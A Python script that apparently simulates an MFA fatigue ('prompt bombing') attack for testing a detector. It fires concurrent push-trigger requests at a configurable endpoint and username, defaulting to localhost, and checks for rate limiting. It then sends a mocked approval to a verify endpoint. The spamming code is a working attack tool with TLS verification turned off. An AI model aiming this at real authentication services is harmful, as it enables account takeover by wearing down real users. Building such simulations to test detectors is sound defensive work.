#!/usr/bin/env python3
import asyncio
import aiohttp
import time
import argparse

async def send_push_request(session, url, username, request_id):
    """Sends a single async POST request to the trigger endpoint."""
    payload = {"username": username}
    try:
        start_time = time.time()
        async with session.post(url, json=payload, ssl=False) as response:
            status = response.status
            text = await response.text()
            elapsed = time.time() - start_time
            
            if status == 200:
                print(f"[Req {request_id}] [SUCCESS] Push triggered in {elapsed:.2f}s")
            elif status == 429:
                print(f"[Req {request_id}] [BLOCKED] Rate Limit Hit (429) in {elapsed:.2f}s")
            else:
                print(f"[Req {request_id}] [ERROR] Status: {status} - {text}")
                
            return status
    except Exception as e:
        print(f"[Req {request_id}] [EXCEPTION] {e}")
        return 0

async def simulate_attack(target_url, username, num_requests, concurrency):
    """Simulates the MFA Fatigue Prompt Bombing."""
    print(f"[*] Starting Shadow MFA Fatigue Attack Simulation")
    print(f"    Target URL  : {target_url}")
    print(f"    Target User : {username}")
    print(f"    Total Reqs  : {num_requests}")
    print(f"    Concurrency : {concurrency}")
    print("-" * 50)
    
    # Use a TCPConnector with limits to manage concurrency
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(1, num_requests + 1):
            tasks.append(send_push_request(session, target_url, username, i))
            
        # Execute tasks concurrently
        await asyncio.gather(*tasks)
        
    print("-" * 50)
    print("[*] Attack simulation completed.")
    print("[*] Now simulating user fatigue (sending a final verify success request)...")
    
    # Simulate user finally pressing approve (Verify endpoint)
    verify_url = target_url.replace('/trigger', '/verify')
    async with aiohttp.ClientSession() as session:
        payload = {"username": username, "status": "success"} # Mocking success
        async with session.post(verify_url, json=payload, ssl=False) as response:
            print(f"[Final] Verify Endpoint Status: {response.status}")
            print(f"[Final] If the detector is running, it should have flagged this!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shadow MFA Fatigue Attack Simulator")
    parser.add_argument("--url", type=str, default="https://localhost:8443/api/v1/auth/mfa/trigger", help="Target endpoint URL")
    parser.add_argument("--user", type=str, default="victim.user", help="Target username")
    parser.add_argument("--requests", type=int, default=10, help="Number of push requests to spam")
    parser.add_argument("--concurrency", type=int, default=5, help="Number of concurrent requests (burst)")
    
    args = parser.parse_args()
    
    # Run async loop
    asyncio.run(simulate_attack(args.url, args.user, args.requests, args.concurrency))
